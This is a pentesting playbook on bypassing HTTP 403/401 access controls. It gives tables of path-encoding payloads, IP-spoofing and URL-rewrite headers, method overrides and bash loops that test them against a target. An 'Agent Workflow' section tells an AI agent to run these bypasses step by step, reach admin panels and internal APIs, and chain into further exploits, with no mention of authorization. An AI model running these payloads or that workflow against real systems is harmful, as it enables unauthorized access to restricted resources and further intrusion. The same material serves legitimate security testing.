# 403 Bypass

> **Summary**: Techniques to bypass HTTP 403 Forbidden and 401 Unauthorized responses by exploiting inconsistencies in how proxies, web servers, and application frameworks parse URLs, headers, and HTTP methods.
> **Impact**: Access to restricted endpoints, admin panels, internal APIs, and protected resources.
> **Typical Severity**: Medium | High

## Detection

### Indicators

- Endpoints returning 403 or 401 that are likely interesting (admin panels, API endpoints, config pages).
- Different response codes for slight URL variations (e.g., `/admin` vs `/admin/`).
- Presence of a reverse proxy or WAF in front of the application (Nginx, Apache, Cloudflare, AWS ALB).
- Technology-specific path parsing (Spring Boot, Express, Flask, PHP-FPM).

### Automated Detection

```bash
# Discover endpoints returning 403
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --status-codes 403 401

# Filter 403 responses from a scan
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -mc 403
```

### Manual Detection

```bash
# Quick check for 403 on known endpoints
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/console
curl -s -o /dev/null -w "%{http_code}" https://target.com/.env
```

## Exploitation

### Prerequisites

- A target endpoint returning 403 or 401.
- Knowledge of the backend technology helps select the most effective bypass technique.
- Ability to modify HTTP requests (Burp Suite, curl, or similar).

### Step-by-Step

1. Identify the blocked endpoint and note the exact 403/401 response (status code, body, headers).
2. Try HTTP method switching on the endpoint.
3. Try URL path manipulation techniques (encoding, case, trailing characters).
4. Try header-based bypasses (IP spoofing, URL rewrite headers).
5. Try protocol version changes.
6. Combine multiple techniques (e.g., header + path manipulation together).
7. If a WAF is present, try request size padding or encoding bypasses (see [WAF Bypass](waf.md)).

### Payloads

#### HTTP Method Switching

When an endpoint blocks GET, try alternative methods:

```
GET /admin      --> 403
POST /admin     --> 200?
PUT /admin      --> 200?
PATCH /admin    --> 200?
DELETE /admin   --> 200?
OPTIONS /admin  --> 200? (may leak allowed methods)
HEAD /admin     --> 200?
TRACE /admin    --> 200?
CONNECT /admin  --> 200?

# Method override headers (when only GET/POST are allowed by proxy)
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

POST /admin HTTP/1.1
X-HTTP-Method: PUT
X-Method-Override: PUT
```

#### URL Path Manipulation

| Technique | Payload |
|---|---|
| Original | `/admin` |
| Trailing slash | `/admin/` |
| Double slash | `//admin` |
| Triple slash | `///admin` |
| Dot segment | `/./admin` |
| Double dot | `/admin/..;/admin` |
| Semicolon (Spring) | `/admin;/` |
| Semicolon with junk | `/admin..;/` |
| Encoded dot | `/admin/%2e` |
| Double encoded dot | `/admin/%252e` |
| Encoded slash | `/%2fadmin` |
| Double encoded slash | `/%252fadmin` |
| Backslash | `/admin\` |
| Encoded backslash | `/admin%5c` |
| Null byte | `/admin%00` |
| Null byte + ext | `/admin%00.json` |
| Unicode dot | `/admin%ef%bc%8e` |
| Tab | `/admin%09` |
| Newline | `/admin%0a` |
| Carriage return | `/admin%0d` |
| Case variation | `/Admin` |
| All caps | `/ADMIN` |
| Mixed case | `/aDmIn` |
| Add extension | `/admin.html` |
| Add extension | `/admin.php` |
| Add extension | `/admin.json` |
| Path parameter | `/admin?anything` |
| Fragment | `/admin#` |
| Wildcard | `/admin*` |
| Suffix dot | `/admin.` |
| Non-standard whitespace | `/admin%20` |
| Double URL encoding | `/%61dmin` |
| Overlong UTF-8 | `/%c0%61dmin` |
| Add .. traversal | `/anything/../admin` |
| URL-encoded traversal | `/anything/..%2fadmin` |

#### Nginx-Specific Bypasses

Nginx performs path normalization before ACL checks. If the backend normalizes differently, certain characters pass through Nginx but are stripped by the app:

| Backend | Bypass Characters |
|---|---|
| Node.js / Express | `\xA0`, `\x09`, `\x0C` |
| Flask | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| Spring Boot | `;`, `\x09` |
| PHP-FPM | `/admin.php/index.php` (path info bypass) |

#### Header-Based Bypass

Inject headers that trick the backend into thinking the request comes from an internal source or should be routed differently:

```http
# IP-based bypass headers (try with 127.0.0.1, 10.0.0.1, 0.0.0.0, etc.)
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 0.0.0.0
X-Forwarded-For: localhost
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Forwarded: for=127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
X-Azure-ClientIP: 127.0.0.1

# URL rewrite headers (overrides the path the backend sees)
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-Path: /admin
Request-Uri: /admin
X-Original-Method: GET

# Host header manipulation
Host: localhost
Host: 127.0.0.1
Host: target.internal
```

#### Protocol Version Change

```bash
# Force HTTP/1.0 (some servers handle access control only on 1.1)
curl -0 https://target.com/admin

# HTTP/2 may bypass rules configured for HTTP/1.1
curl --http2 https://target.com/admin
```

### Proof of Concept

```bash
# Systematic one-liner: test multiple path variations
TARGET="https://target.com"
PATHS=("/admin" "/admin/" "/admin/." "//admin" "/./admin" "/admin..;/" "/admin;/" "/admin%20" "/admin%09" "/Admin" "/ADMIN" "/admin.json" "/%2fadmin" "/admin%00")
for p in "${PATHS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
    echo "$CODE $p"
done

# Test header bypass
for header in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Custom-IP-Authorization: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET/admin")
    echo "$CODE | $header"
done
```

## Bypasses

- Combine path manipulation with header injection simultaneously.
- If the application uses a WAF, pad the request body beyond the WAF inspection limit (8 KB for AWS WAF on ALB, 128 KB for Cloudflare) -- see [WAF Bypass](waf.md).
- Use Unicode compatibility characters that normalize differently on proxy vs backend.
- Use H2C smuggling to bypass WAF/proxy inspection entirely.
- Try ModSecurity path confusion: `%3f` URL-decoded to `?` by ModSecurity but not by the backend.
- Use IP rotation tools to bypass IP-based rate limiting or blocking (fireprox, catspin).

## Escalation

- Once access is gained, enumerate the admin panel or API for further vulnerabilities.
- Chain with authentication bypasses for full administrative access.
- Chain with [WAF Bypass](waf.md) techniques when a WAF is the enforcement layer.
- Access to internal endpoints may expose SSRF, RCE, or sensitive configuration data.

## Tools

| Tool | Usage |
|---|---|
| [bypass-url-parser](https://github.com/laluka/bypass-url-parser) | `python3 bypass-url-parser.py --url https://target.com/admin` |
| [nomore403](https://github.com/devploit/nomore403) | `nomore403 -u https://target.com/admin` |
| [403bypasser](https://github.com/yunemse48/403bypasser) | `python3 403bypasser.py -u https://target.com -d admin` |
| [feroxbuster](https://github.com/epi052/feroxbuster) | `feroxbuster -u https://target.com/admin -w wordlist.txt --dont-filter` |
| [ffuf](https://github.com/ffuf/ffuf) | `ffuf -u https://target.com/FUZZ -w paths.txt -mc all -fc 404` |
| [Burp Suite](https://portswigger.net) | Intruder with header/path wordlists, match-and-replace rules |
| [nowafpls](https://github.com/assetnote/nowafpls) | Burp plugin to pad requests with junk data to exceed WAF inspection limits |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for 403 bypass vulnerabilities.

### Phase 1: Discovery
1. Confirm the target path returns 403 Forbidden:
   ```bash
   curl -s -o /dev/null -w "%{http_code}" https://<TARGET>/<BLOCKED_PATH>
   ```
2. Identify the web server and reverse proxy stack (Nginx, Apache, Cloudflare, AWS ALB, etc.):
   ```bash
   curl -sI https://<TARGET>/ | grep -iE "server|x-powered-by|via"
   ```
3. Identify the backend framework (Spring Boot, Express, Flask, PHP-FPM) from headers, error pages, or fingerprinting
4. Note the exact 403 response: status code, response body content, and response headers (for comparing against bypass attempts)
5. Enumerate other potentially restricted endpoints:
   ```bash
   feroxbuster -u https://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --status-codes 403 401
   ```

### Phase 2: Validation
1. **URL path variations**: Test the blocked path with trailing slash, double slash, dot segments, and encoding:
   ```bash
   PATHS=("/<BLOCKED_PATH>/" "//<BLOCKED_PATH>" "/./<BLOCKED_PATH>" "/<BLOCKED_PATH>/..;/<BLOCKED_PATH>" "/<BLOCKED_PATH>;/" "/<BLOCKED_PATH>%20" "/<BLOCKED_PATH>%09" "/<BLOCKED_PATH>%00" "/<BLOCKED_PATH>.json" "/<BLOCKED_PATH>..;/")
   for p in "${PATHS[@]}"; do
     CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>$p")
     echo "$CODE $p"
   done
   ```
2. **Case variations**: Test `/<BLOCKED_PATH_UPPER>`, `/<BLOCKED_PATH_MIXED>`, `/<BLOCKED_PATH_LOWER>`
3. **URL encoding**: Test single encoding (`%2f`), double encoding (`%252f`), and overlong UTF-8 (`%c0%af`)
4. Identify which variation, if any, returns a non-403 response (200, 301, 302)

### Phase 3: Exploitation
1. **Header-based bypass**: Test IP spoofing and URL rewrite headers:
   ```bash
   HEADERS=("X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Original-URL: /<BLOCKED_PATH>" "X-Rewrite-URL: /<BLOCKED_PATH>" "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1")
   for h in "${HEADERS[@]}"; do
     CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "$h" "https://<TARGET>/<BLOCKED_PATH>")
     echo "$CODE | $h"
   done
   ```
2. **Method override**: Switch from GET to POST, PUT, PATCH; use `X-HTTP-Method-Override: PUT`:
   ```bash
   for method in POST PUT PATCH OPTIONS HEAD; do
     CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method "https://<TARGET>/<BLOCKED_PATH>")
     echo "$CODE $method"
   done
   ```
3. **HTTP version change**: Force HTTP/1.0 or HTTP/2:
   ```bash
   curl -0 -s -o /dev/null -w "%{http_code}" https://<TARGET>/<BLOCKED_PATH>
   curl --http2 -s -o /dev/null -w "%{http_code}" https://<TARGET>/<BLOCKED_PATH>
   ```
4. **Nginx-specific bypass**: Use technology-appropriate characters:
   - Node.js/Express backend: append `\xA0`, `\x09`
   - Flask backend: append `\x85`, `\xA0`
   - Spring Boot backend: append `;`, `\x09`
5. **Combined techniques**: Stack header + path manipulation together for maximum bypass potential

### Phase 4: Escalation
1. Once 403 is bypassed, fully enumerate the previously restricted functionality
2. Access admin panels, internal APIs, or configuration endpoints
3. Chain with authentication bypass for full admin access
4. Look for SSRF, RCE, or sensitive data exposure in the now-accessible endpoints
5. Chain with [WAF Bypass](waf.md) if a WAF is the primary enforcement layer

## Decision Tree

```
403 on /<BLOCKED_PATH>
├── Path variation bypass
│   ├── /<BLOCKED_PATH>/ (trailing slash) → 200?
│   ├── //<BLOCKED_PATH> (double slash) → 200?
│   ├── /./<BLOCKED_PATH> (dot segment) → 200?
│   ├── /<BLOCKED_PATH>;/ (semicolon -- Spring) → 200?
│   ├── /<BLOCKED_PATH>..;/ → 200?
│   ├── /<BLOCKED_PATH>%00 (null byte) → 200?
│   ├── /<BLOCKED_PATH>.json (extension) → 200?
│   └── URL encoding / double encoding → 200?
├── Header bypass
│   ├── X-Original-URL: /<BLOCKED_PATH> → 200?
│   ├── X-Rewrite-URL: /<BLOCKED_PATH> → 200?
│   ├── X-Forwarded-For: 127.0.0.1 → 200?
│   └── X-Custom-IP-Authorization: 127.0.0.1 → 200?
├── Method override
│   ├── POST instead of GET → 200?
│   ├── X-HTTP-Method-Override: PUT → 200?
│   └── OPTIONS → allowed methods revealed?
├── HTTP version change
│   ├── HTTP/1.0 → 200?
│   └── HTTP/2 → 200?
├── Nginx-specific
│   ├── Backend is Node.js → \xA0, \x09
│   ├── Backend is Flask → \x85, \xA0
│   └── Backend is Spring → ;, \x09
└── Combined techniques
    └── Header + path + method stacked → 200?
```

## Success Criteria
- [ ] HTTP 200 response received on a previously 403-blocked endpoint
- [ ] Content of the restricted page/API successfully retrieved
- [ ] Admin panel or internal API accessed via the bypass
- [ ] Multiple bypass techniques identified for comprehensive coverage

## References

- [HackTricks - Proxy/WAF Protections Bypass](https://book.hacktricks.wiki/en/pentesting-web/proxy-waf-protections-bypass.html)
- [Exploiting HTTP Parsers Inconsistencies - Rafa](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [ModSecurity Path Confusion Bugs Bypass](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
- [PayloadsAllTheThings - 403 Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/403%20Bypass)
- [403 Bypass Cheat Sheet](https://portswigger.net/bappstore)
